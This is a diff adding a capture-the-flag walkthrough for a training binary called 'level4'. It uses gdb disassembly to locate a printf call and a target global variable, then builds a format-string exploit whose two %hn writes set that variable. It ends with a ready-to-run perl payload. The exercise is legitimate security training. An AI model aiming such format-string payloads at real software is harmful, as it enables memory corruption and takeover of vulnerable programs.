@@ -1,0 +1,55 @@
+Another printf. We also need to modify a global variable :
+
+    gdb> disas p
+    0x0804844a <+6>:	mov    eax,DWORD PTR [ebp+0x8]
+    0x0804844d <+9>:	mov    DWORD PTR [esp],eax
+    0x08048450 <+12>:	call   0x8048340 <printf@plt>
+    gdb> disas n
+    0x08048488 <+49>:	call   0x8048444 <p>
+    0x0804848d <+54>:	mov    eax,ds:0x8049810 # Global variable
+    0x08048492 <+59>:	cmp    eax,0x1025544    # cmp 0, 16930116
+
+Buffer size is 512 :
+
+    gdb> disas p
+    0x0804845a <+3>:	sub    esp,0x218
+    0x08048460 <+9>:	mov    eax,ds:0x8049804
+    0x08048465 <+14>:	mov    DWORD PTR [esp+0x8],eax
+    0x08048469 <+18>:	mov    DWORD PTR [esp+0x4],0x200 # = 512
+
+The number of arguments to put in printf to access our buffer is 12 :
+
+    ./level4
+    BBBB.1-%p.2-%p.3-%p.4-%p.5-%p.6-%p.7-%p.8-%p.9-%p.10-%p.11-%p.12-%p
+    BBBB.0xb7ff26b0.0xbffff744.0xb7fd0ff4.(nil).(nil).0xbffff708.0x804848d.0xbffff500.0x200.0xb7fd1ac0.0xb7ff37d0.0x42424242
+
+The address at which we will write is 0x8049810.
+We will write the value in two steps :
+
+0x8049812 : 0x0102 (258)
+0x8049810 : 0x5544 (21828)
+
+The paylaod will look like this :
+
+Our Arguments :
+    [0x8049812 : 4][AAAA : 4][0x8049810 : 4]...
+
+Offset arguments :
+    258 - 3x4 = 246
+    246 / 11 = 22 + 4
+
+    [0x8049812 : 4][AAAA : 4][0x8049810 : 4]['%22d' x 11][BBBB]
+
+First %n :
+                                                                         | = 4 + 4 + 4 + 242 + 4 = 258
+    [0x8049812 : 4][AAAA : 4][0x8049810 : 4]['%22d' x 11 : 242][BBBB : 4][%n]
+
+Second %n :
+
+    Remaining chars to pring : 21828 - 258 = 21570
+
+    [0x8049812 : 4][AAAA : 4][0x8049810 : 4]['%22d' x 11 : 242][BBBB : 4][%n][%21570d][%n][\n]
+
+final payload :
+
+perl -e 'print "\x12\x98\x04\x08" . "AAAA" . "\x10\x98\x04\x08" . "%22d"x11 . "BBBB" . "%hn" . "%21570d" . "%hn"' > /tmp/level4
